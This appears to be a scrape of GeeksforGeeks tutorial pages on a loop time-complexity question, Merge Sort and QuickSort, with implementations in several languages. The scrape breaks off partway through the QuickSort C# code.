(Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops) A Time Complexity Question Last Updated: 29-10-2020 What is the time complexity of following function fun()? Assume that log(x) returns log value in base 2. C filter_none edit close play_arrow link brightness_4 code void fun() { int i, j; for (i = 1; i <= n; i++) for (j = 1; j <= log(i); j++) printf("GeeksforGeeks"); } chevron_right filter_none Time Complexity of the above function can be written as θ(log 1) + θ(log 2) + θ(log 3) + . . . . + θ(log n) which is θ(log n!)Order of growth of ‘log n!’ and ‘n log n’ is same for large values of n, i.e., θ(log n!) = θ(n log n). So time complexity of fun() is θ(n log n).The expression θ(log n!) = θ(n log n) can be easily derived from following Stirling’s approximation (or Stirling’s formula). log n! = n*log n - n = O(n*log(n)) Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.Sources: http://en.wikipedia.org/wiki/Stirling%27s_approximation Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:An interesting time complexity questionTime Complexity of building a heapTime Complexity where loop variable is incremented by 1, 2, 3, 4 ..Time Complexity of a Loop when Loop variable “Expands or Shrinks” exponentiallyTime complexity of recursive Fibonacci programPractice Questions on Time Complexity AnalysisTime Complexity Analysis | Tower Of Hanoi (Recursion)Python Code for time Complexity plot of Heap SortC program for Time Complexity plot of Bubble, Insertion and Selection Sort using GnuplotTime Complexity of Loop with PowersUnderstanding Time Complexity with Simple ExamplesWhat does 'Space Complexity' mean?Complexity of different operations in Binary tree, Binary Search Tree and AVL treeKnowing the complexity in competitive programmingCyclomatic ComplexityComplexity Analysis of Binary SearchComplexity analysis of various operations of Binary Min HeapTime taken by Loop unrolling vs Normal loopMeasure execution time with high precision in C/C++Microsoft Interview experience for full time position of software engineer at Microsoft Ireland ResearchImproved By : vroghelia6 Article Tags : Analysis thumb_up 34 To-do Done 2.3 Based on 92 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page What does ‘Space Complexity’ mean? Next last_page Analysis of Algorithms | Set 1 (Asymptotic Analysis) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Complexity of different operations in Binary tree, Binary Search Tree and AVL treeProof that Clique Decision problem is NP-Complete | Set 2Understanding Time Complexity with Simple ExamplesDifference between NP hard and NP complete problemPractice Questions on Time Complexity Analysis More related articles in Analysis Complexity Analysis of Binary SearchCyclomatic ComplexityAnalysis of Algorithms | Set 5 (Practice Problems)Analysis of different sorting techniquesProof that SAT is NP Complete room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Merge Sort - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Merge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueGreedy Algorithm to find Minimum number of CoinsK Centers Problem | Set 1 (Greedy Approximate Algorithm)Minimum Number of Platforms Required for a Railway/Bus StationBinary SearchCount Inversions in an array | Set 1 (Using Merge Sort)Program for Tower of Hanoi Merge Sort Last Updated: 18-11-2020 Like QuickSort, Merge Sort is a Divide and Conquer algorithm. It divides the input array into two halves, calls itself for the two halves, and then merges the two sorted halves. The merge() function is used for merging two halves. The merge(arr, l, m, r) is a key process that assumes that arr[l..m] and arr[m+1..r] are sorted and merges the two sorted sub-arrays into one. See the following C implementation for details. MergeSort(arr[], l, r) If r > l 1. Find the middle point to divide the array into two halves: middle m = (l+r)/2 2. Call mergeSort for first half: Call mergeSort(arr, l, m) 3. Call mergeSort for second half: Call mergeSort(arr, m+1, r) 4. Merge the two halves sorted in step 2 and 3: Call merge(arr, l, m, r) The following diagram from wikipedia shows the complete merge sort process for an example array {38, 27, 43, 3, 9, 82, 10}. If we take a closer look at the diagram, we can see that the array is recursively divided in two halves till the size becomes 1. Once the size becomes 1, the merge processes come into action and start merging arrays back till the complete array is merged. Recommended: Please solve it on “PRACTICE” first, before moving on to the solution. C++ filter_none edit close play_arrow link brightness_4 code // C++ program for Merge Sort #include <iostream> using namespace std; // Merges two subarrays of arr[]. // First subarray is arr[l..m] // Second subarray is arr[m+1..r] void merge(int arr[], int l, int m, int r) { int n1 = m - l + 1; int n2 = r - m; // Create temp arrays int L[n1], R[n2]; // Copy data to temp arrays L[] and R[] for (int i = 0; i < n1; i++) L[i] = arr[l + i]; for (int j = 0; j < n2; j++) R[j] = arr[m + 1 + j]; // Merge the temp arrays back into arr[l..r] // Initial index of first subarray int i = 0; // Initial index of second subarray int j = 0; // Initial index of merged subarray int k = l; while (i < n1 && j < n2) { if (L[i] <= R[j]) { arr[k] = L[i]; i++; } else { arr[k] = R[j]; j++; } k++; } // Copy the remaining elements of // L[], if there are any while (i < n1) { arr[k] = L[i]; i++; k++; } // Copy the remaining elements of // R[], if there are any while (j < n2) { arr[k] = R[j]; j++; k++; } } // l is for left index and r is // right index of the sub-array // of arr to be sorted */ void mergeSort(int arr[],int l,int r){ if(l>=r){ return;//returns recursively } int m = (l+r-1)/2; mergeSort(arr,l,m); mergeSort(arr,m+1,r); merge(arr,l,m,r); } // UTILITY FUNCTIONS // Function to print an array void printArray(int A[], int size) { for (int i = 0; i < size; i++) cout << A[i] << " "; } // Driver code int main() { int arr[] = { 12, 11, 13, 5, 6, 7 }; int arr_size = sizeof(arr) / sizeof(arr[0]); cout << "Given array is \n"; printArray(arr, arr_size); mergeSort(arr, 0, arr_size - 1); cout << "\nSorted array is \n"; printArray(arr, arr_size); return 0; } // This code is contributed by Mayank Tyagi chevron_right filter_none C filter_none edit close play_arrow link brightness_4 code /* C program for Merge Sort */ #include <stdio.h> #include <stdlib.h> // Merges two subarrays of arr[]. // First subarray is arr[l..m] // Second subarray is arr[m+1..r] void merge(int arr[], int l, int m, int r) { int i, j, k; int n1 = m - l + 1; int n2 = r - m; /* create temp arrays */ int L[n1], R[n2]; /* Copy data to temp arrays L[] and R[] */ for (i = 0; i < n1; i++) L[i] = arr[l + i]; for (j = 0; j < n2; j++) R[j] = arr[m + 1 + j]; /* Merge the temp arrays back into arr[l..r]*/ i = 0; // Initial index of first subarray j = 0; // Initial index of second subarray k = l; // Initial index of merged subarray while (i < n1 && j < n2) { if (L[i] <= R[j]) { arr[k] = L[i]; i++; } else { arr[k] = R[j]; j++; } k++; } /* Copy the remaining elements of L[], if there are any */ while (i < n1) { arr[k] = L[i]; i++; k++; } /* Copy the remaining elements of R[], if there are any */ while (j < n2) { arr[k] = R[j]; j++; k++; } } /* l is for left index and r is right index of the sub-array of arr to be sorted */ void mergeSort(int arr[], int l, int r) { if (l < r) { // Same as (l+r)/2, but avoids overflow for // large l and h int m = l + (r - l) / 2; // Sort first and second halves mergeSort(arr, l, m); mergeSort(arr, m + 1, r); merge(arr, l, m, r); } } /* UTILITY FUNCTIONS */ /* Function to print an array */ void printArray(int A[], int size) { int i; for (i = 0; i < size; i++) printf("%d ", A[i]); printf("\n"); } /* Driver code */ int main() { int arr[] = { 12, 11, 13, 5, 6, 7 }; int arr_size = sizeof(arr) / sizeof(arr[0]); printf("Given array is \n"); printArray(arr, arr_size); mergeSort(arr, 0, arr_size - 1); printf("\nSorted array is \n"); printArray(arr, arr_size); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code /* Java program for Merge Sort */ class MergeSort { // Merges two subarrays of arr[]. // First subarray is arr[l..m] // Second subarray is arr[m+1..r] void merge(int arr[], int l, int m, int r) { // Find sizes of two subarrays to be merged int n1 = m - l + 1; int n2 = r - m; /* Create temp arrays */ int L[] = new int[n1]; int R[] = new int[n2]; /*Copy data to temp arrays*/ for (int i = 0; i < n1; ++i) L[i] = arr[l + i]; for (int j = 0; j < n2; ++j) R[j] = arr[m + 1 + j]; /* Merge the temp arrays */ // Initial indexes of first and second subarrays int i = 0, j = 0; // Initial index of merged subarry array int k = l; while (i < n1 && j < n2) { if (L[i] <= R[j]) { arr[k] = L[i]; i++; } else { arr[k] = R[j]; j++; } k++; } /* Copy remaining elements of L[] if any */ while (i < n1) { arr[k] = L[i]; i++; k++; } /* Copy remaining elements of R[] if any */ while (j < n2) { arr[k] = R[j]; j++; k++; } } // Main function that sorts arr[l..r] using // merge() void sort(int arr[], int l, int r) { if (l < r) { // Find the middle point int m = (l + r) / 2; // Sort first and second halves sort(arr, l, m); sort(arr, m + 1, r); // Merge the sorted halves merge(arr, l, m, r); } } /* A utility function to print array of size n */ static void printArray(int arr[]) { int n = arr.length; for (int i = 0; i < n; ++i) System.out.print(arr[i] + " "); System.out.println(); } // Driver code public static void main(String args[]) { int arr[] = { 12, 11, 13, 5, 6, 7 }; System.out.println("Given Array"); printArray(arr); MergeSort ob = new MergeSort(); ob.sort(arr, 0, arr.length - 1); System.out.println("\nSorted array"); printArray(arr); } } /* This code is contributed by Rajat Mishra */ chevron_right filter_none Python3 filter_none edit close play_arrow link brightness_4 code # Python program for implementation of MergeSort def mergeSort(arr): if len(arr) > 1: # Finding the mid of the array mid = len(arr)//2 # Dividing the array elements L = arr[:mid] # into 2 halves R = arr[mid:] # Sorting the first half mergeSort(L) # Sorting the second half mergeSort(R) i = j = k = 0 # Copy data to temp arrays L[] and R[] while i < len(L) and j < len(R): if L[i] < R[j]: arr[k] = L[i] i += 1 else: arr[k] = R[j] j += 1 k += 1 # Checking if any element was left while i < len(L): arr[k] = L[i] i += 1 k += 1 while j < len(R): arr[k] = R[j] j += 1 k += 1 # Code to print the list def printList(arr): for i in range(len(arr)): print(arr[i], end=" ") print() # Driver Code if __name__ == '__main__': arr = [12, 11, 13, 5, 6, 7] print("Given array is", end="\n") printList(arr) mergeSort(arr) print("Sorted array is: ", end="\n") printList(arr) # This code is contributed by Mayank Khanna chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# program for Merge Sort using System; class MergeSort { // Merges two subarrays of []arr. // First subarray is arr[l..m] // Second subarray is arr[m+1..r] void merge(int[] arr, int l, int m, int r) { // Find sizes of two // subarrays to be merged int n1 = m - l + 1; int n2 = r - m; // Create temp arrays int[] L = new int[n1]; int[] R = new int[n2]; int i, j; // Copy data to temp arrays for (i = 0; i < n1; ++i) L[i] = arr[l + i]; for (j = 0; j < n2; ++j) R[j] = arr[m + 1 + j]; // Merge the temp arrays // Initial indexes of first // and second subarrays i = 0; j = 0; // Initial index of merged // subarry array int k = l; while (i < n1 && j < n2) { if (L[i] <= R[j]) { arr[k] = L[i]; i++; } else { arr[k] = R[j]; j++; } k++; } // Copy remaining elements // of L[] if any while (i < n1) { arr[k] = L[i]; i++; k++; } // Copy remaining elements // of R[] if any while (j < n2) { arr[k] = R[j]; j++; k++; } } // Main function that // sorts arr[l..r] using // merge() void sort(int[] arr, int l, int r) { if (l < r) { // Find the middle // point int m = (l + r) / 2; // Sort first and // second halves sort(arr, l, m); sort(arr, m + 1, r); // Merge the sorted halves merge(arr, l, m, r); } } // A utility function to // print array of size n */ static void printArray(int[] arr) { int n = arr.Length; for (int i = 0; i < n; ++i) Console.Write(arr[i] + " "); Console.WriteLine(); } // Driver code public static void Main(String[] args) { int[] arr = { 12, 11, 13, 5, 6, 7 }; Console.WriteLine("Given Array"); printArray(arr); MergeSort ob = new MergeSort(); ob.sort(arr, 0, arr.Length - 1); Console.WriteLine("\nSorted array"); printArray(arr); } } // This code is contributed by Princi Singh chevron_right filter_none Output Given array is 12 11 13 5 6 7 Sorted array is 5 6 7 11 12 13 Time Complexity: Sorting arrays on different machines. Merge Sort is a recursive algorithm and time complexity can be expressed as following recurrence relation. T(n) = 2T(n/2) + θ(n) The above recurrence can be solved either using the Recurrence Tree method or the Master method. It falls in case II of Master Method and the solution of the recurrence is θ(nLogn). Time complexity of Merge Sort is θ(nLogn) in all 3 cases (worst, average and best) as merge sort always divides the array into two halves and takes linear time to merge two halves.Auxiliary Space: O(n)Algorithmic Paradigm: Divide and ConquerSorting In Place: No in a typical implementationStable: Yes Applications of Merge Sort Merge Sort is useful for sorting linked lists in O(nLogn) time.In the case of linked lists, the case is different mainly due to the difference in memory allocation of arrays and linked lists. Unlike arrays, linked list nodes may not be adjacent in memory. Unlike an array, in the linked list, we can insert items in the middle in O(1) extra space and O(1) time. Therefore, the merge operation of merge sort can be implemented without extra space for linked lists.In arrays, we can do random access as elements are contiguous in memory. Let us say we have an integer (4-byte) array A and let the address of A[0] be x then to access A[i], we can directly access the memory at (x + i*4). Unlike arrays, we can not do random access in the linked list. Quick Sort requires a lot of this kind of access. In a linked list to access i’th index, we have to travel each and every node from the head to i’th node as we don’t have a continuous block of memory. Therefore, the overhead increases for quicksort. Merge sort accesses data sequentially and the need of random access is low. Inversion Count Problem Used in External Sorting Recent Articles on Merge Sort Coding practice for sorting. Quiz on Merge Sort Other Sorting Algorithms on GeeksforGeeks: 3-way Merge Sort, Selection Sort, Bubble Sort, Insertion Sort, Merge Sort, Heap Sort, QuickSort, Radix Sort, Counting Sort, Bucket Sort, ShellSort, Comb SortPlease write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Merge Sort with O(1) extra space merge and O(n lg n) timeWhy Quick Sort preferred for Arrays and Merge Sort for Linked Lists?Quick Sort vs Merge SortMerge Sort vs. Insertion SortComparison among Bubble Sort, Selection Sort and Insertion SortMerge Sort for Linked ListsMerge Sort for Doubly Linked List3-way Merge SortUnion and Intersection of two linked lists | Set-2 (Using Merge Sort)C Program for Iterative Merge SortJava Program for Iterative Merge SortPython Program for Iterative Merge SortFind array with k number of merge sort callsMerge Sort using Multi-threadingComparisons involved in Modified Quicksort Using Merge Sort TreeMerge Sort for Linked Lists in JavaScriptIn-Place Merge SortSorting Algorithm Visualization : Merge SortCount of distinct numbers in an Array in a range for Online Queries using Merge Sort TreeIterative Merge SortImproved By : chitranayal, Mayank Khanna 2, pineconelam, jnjomnsn, mayanktyagi1709, more princi singh, naveenkuma150, vishalg2 Article Tags : Divide and ConquerSortingAmazonBoomerang CommerceGoldman SachsGrofersMicrosoftOraclePaytmQualcommSnapdealTarget Corporation Practice Tags : PaytmAmazonMicrosoftSnapdealOracleGoldman SachsQualcommBoomerang CommerceGrofersTarget CorporationDivide and ConquerSorting thumb_up 230 To-do Done 2.7 Based on 287 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Insertion Sort Next last_page Maximum Subarray Sum using Divide and Conquer algorithm Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Divide and Conquer Maximum and minimum of an array using minimum number of comparisonsComplexity Analysis of Binary SearchDivide and Conquer Algorithm | IntroductionWrite a program to calculate pow(x,n)Median of two sorted arrays of same size Most visited in Sorting Bubble SortInsertion SortSelection SortTime Complexities of all Sorting Algorithmsstd::sort() in C++ STL room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

QuickSort - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Merge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueGreedy Algorithm to find Minimum number of CoinsK Centers Problem | Set 1 (Greedy Approximate Algorithm)Minimum Number of Platforms Required for a Railway/Bus StationBinary SearchCount Inversions in an array | Set 1 (Using Merge Sort)Program for Tower of Hanoi QuickSort Last Updated: 04-09-2020 Like Merge Sort, QuickSort is a Divide and Conquer algorithm. It picks an element as pivot and partitions the given array around the picked pivot. There are many different versions of quickSort that pick pivot in different ways. Always pick first element as pivot. Always pick last element as pivot (implemented below) Pick a random element as pivot. Pick median as pivot. The key process in quickSort is partition(). Target of partitions is, given an array and an element x of array as pivot, put x at its correct position in sorted array and put all smaller elements (smaller than x) before x, and put all greater elements (greater than x) after x. All this should be done in linear time. Pseudo Code for recursive QuickSort function : /* low --> Starting index, high --> Ending index */ quickSort(arr[], low, high) { if (low < high) { /* pi is partitioning index, arr[pi] is now at right place */ pi = partition(arr, low, high); quickSort(arr, low, pi - 1); // Before pi quickSort(arr, pi + 1, high); // After pi } } Partition Algorithm There can be many ways to do partition, following pseudo code adopts the method given in CLRS book. The logic is simple, we start from the leftmost element and keep track of index of smaller (or equal to) elements as i. While traversing, if we find a smaller element, we swap current element with arr[i]. Otherwise we ignore current element. /* low --> Starting index, high --> Ending index */ quickSort(arr[], low, high) { if (low < high) { /* pi is partitioning index, arr[pi] is now at right place */ pi = partition(arr, low, high); quickSort(arr, low, pi - 1); // Before pi quickSort(arr, pi + 1, high); // After pi } } Pseudo code for partition() /* This function takes last element as pivot, places the pivot element at its correct position in sorted array, and places all smaller (smaller than pivot) to left of pivot and all greater elements to right of pivot */ partition (arr[], low, high) { // pivot (Element to be placed at right position) pivot = arr[high]; i = (low - 1) // Index of smaller element for (j = low; j <= high- 1; j++) { // If current element is smaller than the pivot if (arr[j] < pivot) { i++; // increment index of smaller element swap arr[i] and arr[j] } } swap arr[i + 1] and arr[high]) return (i + 1) } Illustration of partition() : arr[] = {10, 80, 30, 90, 40, 50, 70} Indexes: 0 1 2 3 4 5 6 low = 0, high = 6, pivot = arr[h] = 70 Initialize index of smaller element, i = -1 Traverse elements from j = low to high-1 j = 0 : Since arr[j] <= pivot, do i++ and swap(arr[i], arr[j]) i = 0 arr[] = {10, 80, 30, 90, 40, 50, 70} // No change as i and j // are same j = 1 : Since arr[j] > pivot, do nothing // No change in i and arr[] j = 2 : Since arr[j] <= pivot, do i++ and swap(arr[i], arr[j]) i = 1 arr[] = {10, 30, 80, 90, 40, 50, 70} // We swap 80 and 30 j = 3 : Since arr[j] > pivot, do nothing // No change in i and arr[] j = 4 : Since arr[j] <= pivot, do i++ and swap(arr[i], arr[j]) i = 2 arr[] = {10, 30, 40, 90, 80, 50, 70} // 80 and 40 Swapped j = 5 : Since arr[j] <= pivot, do i++ and swap arr[i] with arr[j] i = 3 arr[] = {10, 30, 40, 50, 80, 90, 70} // 90 and 50 Swapped We come out of loop because j is now equal to high-1. Finally we place pivot at correct position by swapping arr[i+1] and arr[high] (or pivot) arr[] = {10, 30, 40, 50, 70, 90, 80} // 80 and 70 Swapped Now 70 is at its correct place. All elements smaller than 70 are before it and all elements greater than 70 are after it. Recommended: Please solve it on “PRACTICE” first, before moving on to the solution. Implementation: Following are the implementations of QuickSort: C++ filter_none edit close play_arrow link brightness_4 code /* C++ implementation of QuickSort */ #include <bits/stdc++.h> using namespace std; // A utility function to swap two elements void swap(int* a, int* b) { int t = *a; *a = *b; *b = t; } /* This function takes last element as pivot, places the pivot element at its correct position in sorted array, and places all smaller (smaller than pivot) to left of pivot and all greater elements to right of pivot */ int partition (int arr[], int low, int high) { int pivot = arr[high]; // pivot int i = (low - 1); // Index of smaller element for (int j = low; j <= high - 1; j++) { // If current element is smaller than the pivot if (arr[j] < pivot) { i++; // increment index of smaller element swap(&arr[i], &arr[j]); } } swap(&arr[i + 1], &arr[high]); return (i + 1); } /* The main function that implements QuickSort arr[] --> Array to be sorted, low --> Starting index, high --> Ending index */ void quickSort(int arr[], int low, int high) { if (low < high) { /* pi is partitioning index, arr[p] is now at right place */ int pi = partition(arr, low, high); // Separately sort elements before // partition and after partition quickSort(arr, low, pi - 1); quickSort(arr, pi + 1, high); } } /* Function to print an array */ void printArray(int arr[], int size) { int i; for (i = 0; i < size; i++) cout << arr[i] << " "; cout << endl; } // Driver Code int main() { int arr[] = {10, 7, 8, 9, 1, 5}; int n = sizeof(arr) / sizeof(arr[0]); quickSort(arr, 0, n - 1); cout << "Sorted array: \n"; printArray(arr, n); return 0; } // This code is contributed by rathbhupendra chevron_right filter_none C filter_none edit close play_arrow link brightness_4 code /* C implementation QuickSort */ #include<stdio.h> // A utility function to swap two elements void swap(int* a, int* b) { int t = *a; *a = *b; *b = t; } /* This function takes last element as pivot, places the pivot element at its correct position in sorted array, and places all smaller (smaller than pivot) to left of pivot and all greater elements to right of pivot */ int partition (int arr[], int low, int high) { int pivot = arr[high]; // pivot int i = (low - 1); // Index of smaller element for (int j = low; j <= high- 1; j++) { // If current element is smaller than the pivot if (arr[j] < pivot) { i++; // increment index of smaller element swap(&arr[i], &arr[j]); } } swap(&arr[i + 1], &arr[high]); return (i + 1); } /* The main function that implements QuickSort arr[] --> Array to be sorted, low --> Starting index, high --> Ending index */ void quickSort(int arr[], int low, int high) { if (low < high) { /* pi is partitioning index, arr[p] is now at right place */ int pi = partition(arr, low, high); // Separately sort elements before // partition and after partition quickSort(arr, low, pi - 1); quickSort(arr, pi + 1, high); } } /* Function to print an array */ void printArray(int arr[], int size) { int i; for (i=0; i < size; i++) printf("%d ", arr[i]); printf("\n"); } // Driver program to test above functions int main() { int arr[] = {10, 7, 8, 9, 1, 5}; int n = sizeof(arr)/sizeof(arr[0]); quickSort(arr, 0, n-1); printf("Sorted array: \n"); printArray(arr, n); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Java program for implementation of QuickSort class QuickSort { /* This function takes last element as pivot, places the pivot element at its correct position in sorted array, and places all smaller (smaller than pivot) to left of pivot and all greater elements to right of pivot */ int partition(int arr[], int low, int high) { int pivot = arr[high]; int i = (low-1); // index of smaller element for (int j=low; j<high; j++) { // If current element is smaller than the pivot if (arr[j] < pivot) { i++; // swap arr[i] and arr[j] int temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; } } // swap arr[i+1] and arr[high] (or pivot) int temp = arr[i+1]; arr[i+1] = arr[high]; arr[high] = temp; return i+1; } /* The main function that implements QuickSort() arr[] --> Array to be sorted, low --> Starting index, high --> Ending index */ void sort(int arr[], int low, int high) { if (low < high) { /* pi is partitioning index, arr[pi] is now at right place */ int pi = partition(arr, low, high); // Recursively sort elements before // partition and after partition sort(arr, low, pi-1); sort(arr, pi+1, high); } } /* A utility function to print array of size n */ static void printArray(int arr[]) { int n = arr.length; for (int i=0; i<n; ++i) System.out.print(arr[i]+" "); System.out.println(); } // Driver program public static void main(String args[]) { int arr[] = {10, 7, 8, 9, 1, 5}; int n = arr.length; QuickSort ob = new QuickSort(); ob.sort(arr, 0, n-1); System.out.println("sorted array"); printArray(arr); } } /*This code is contributed by Rajat Mishra */ chevron_right filter_none Python filter_none edit close play_arrow link brightness_4 code # Python program for implementation of Quicksort Sort # This function takes last element as pivot, places # the pivot element at its correct position in sorted # array, and places all smaller (smaller than pivot) # to left of pivot and all greater elements to right # of pivot def partition(arr,low,high): i = ( low-1 ) # index of smaller element pivot = arr[high] # pivot for j in range(low , high): # If current element is smaller than the pivot if arr[j] < pivot: # increment index of smaller element i = i+1 arr[i],arr[j] = arr[j],arr[i] arr[i+1],arr[high] = arr[high],arr[i+1] return ( i+1 ) # The main function that implements QuickSort # arr[] --> Array to be sorted, # low --> Starting index, # high --> Ending index # Function to do Quick sort def quickSort(arr,low,high): if low < high: # pi is partitioning index, arr[p] is now # at right place pi = partition(arr,low,high) # Separately sort elements before # partition and after partition quickSort(arr, low, pi-1) quickSort(arr, pi+1, high) # Driver code to test above arr = [10, 7, 8, 9, 1, 5] n = len(arr) quickSort(arr,0,n-1) print ("Sorted array is:") for i in range(n): print ("%d" %arr[i]), # This code is contributed by Mohit Kumra chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# program for implementation of QuickSort using System; class GFG { /* This function takes last element as pivot, places the pivot element at its correct position in sorted array, and places all smaller (smaller than pivot) to left of pivot and all greater elements to right of pivot */ static int partition(int []arr, int low, int high) { int pivot = arr[high]; // index of smaller element int i = (low - 1); for (int j = low; j < high; j++) { // If current element is smaller // than the pivot if (arr[j] < pivot) { i++; // swap arr[i] and arr[j] int temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; } } // swap arr[i+1] and arr[high] (or pivot) int temp1 = arr[i+1]; arr[i+1] = arr[high]; arr[high] = temp1; return i+1; } /* The main function that implements QuickSort() arr[] --> Array to be sorted, low --> Starting index, high --> Ending index */ static void quickSort(int []arr, int low, int high) { if (low < high) { /* pi is partitioning index, arr[pi] is now at right place */ int pi = partition(arr, low, high); // Recursively sort elements before // partition and after partition quickSort(arr, low, pi-1); quickSort(arr, pi+1, high); } } // A utility function to print array of size n static void printArray(int []arr, int n) { for (int i = 0; i < n; ++i) Console.Write(arr[i] + " "); Console.WriteLine(); } // Driver program public static void Main() { int []arr = {10, 7, 8, 9, 1, 5}; int n = arr.Length; 